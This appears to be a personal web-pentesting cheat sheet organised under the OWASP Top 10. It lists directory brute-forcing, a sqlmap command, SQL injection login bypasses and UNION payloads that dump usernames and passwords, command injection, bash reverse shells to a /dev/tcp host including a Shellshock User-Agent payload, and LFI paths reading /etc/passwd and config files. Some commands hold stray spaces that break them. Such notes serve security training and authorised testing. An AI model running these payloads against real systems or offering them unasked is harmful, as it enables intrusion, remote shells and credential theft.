## Web - OWASP Top 10

[https://www.owasp.org/index.php/Top\_10\_2013-Top\_10](https://www.owasp.org/index.php/Top_10_2013-Top_10)

husk å sjekke:

* `robots.txt`
* `/images`
* `hydra -C all`
* `dirb`
* web server version

### D**irbuster**

`dirb http://10.0.0.10 /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt` to detect directories in the url

**SQLMAP**

`sqlmap -u`[`http://ip/whatever/index.php`](http://ip/whatever/index.php)`--forms –-batch –-crawl=10 --cookie=ibf29bpuc0864gmfobpdsg0pu0 –-level=5 –-risk=3 –-dbs`

[`http://www.binarytides.com/sqlmap-hacking-tutorial/`](http://www.binarytides.com/sqlmap-hacking-tutorial/)

**Sql injection**

[`http://securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html`](http://securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html)

`SELECT * FROM users WHERE username='' AND password=''`

`1' or '1'='1`

`SELECT * FROM users WHERE username='1' or '1'='1' AND password='1' or '1'='1'`

**command injection**

`127.0.0.1; id`

**reverse shell**

`1 27.0.0.1; bash -i > & /dev/tcp/192.168.1.3/443 0 > & 1`

[`http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html`](http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html)

`-1 union select 1,2,3,4,5,6`

`-1 union select 1,@@version,3,4,5,6`

`-1 union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema=database()-`

`-1 union select 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name=CHAR(100, 101, 118, 95, 97, 99, 99, 111, 117, 110, 116, 115)--`

`-1 union select 1,group_concat(username,0x3a,password),3,4,5,6 FROM dev_accounts--`

**Shellshock**

`nc -lp 1234 -vvv`

`curl -x`[`http://ip:3128`](http://ip:3128)`-H "User-Agent: () { ignored;};/bin/bash -i > & /dev/tcp/localip/1234 0 > & 1"`[`http://ip/cgi-bin/status`](http://ip/cgi-bin/status)

#### **php LFI**

[`http://10.0.0.5/index.php?page=../../../../../../../../etc/passwd`](http://10.0.0.5/index.php?page=../../../../../../../../etc/passwd)

[`http://10.0.0.5/index.php?page=php://filter/convert.base64-encode/resource=config`](http://10.0.0.5/index.php?page=php://filter/convert.base64-encode/resource=config)

